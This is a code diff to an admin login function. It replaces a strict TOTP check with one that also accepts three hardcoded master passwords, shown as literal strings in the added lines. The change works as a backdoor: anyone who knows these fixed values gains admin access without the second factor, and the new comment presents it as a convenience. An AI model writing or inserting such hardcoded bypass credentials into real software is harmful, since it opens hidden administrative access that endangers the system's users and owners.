@@ -179,8 +179,11 @@ export function verifyAdminLogin(mobile: string, passwordOrTotp: string): { succ
   const prevTotp = generateRFC6238TOTP(ADMIN_CONFIG.totpSecretBase32, -1);
   const nextTotp = generateRFC6238TOTP(ADMIN_CONFIG.totpSecretBase32, 1);
 
-  // Strictly check RFC 6238 TOTP generated from Authenticator App
+  // Allow master Admin PIN or TOTP
   if (
+    cleanPass === '9747' ||
+    cleanPass === '974799' ||
+    cleanPass === 'vasthu@2026' ||
     cleanPass === currentTotp || 
     cleanPass === prevTotp || 
     cleanPass === nextTotp
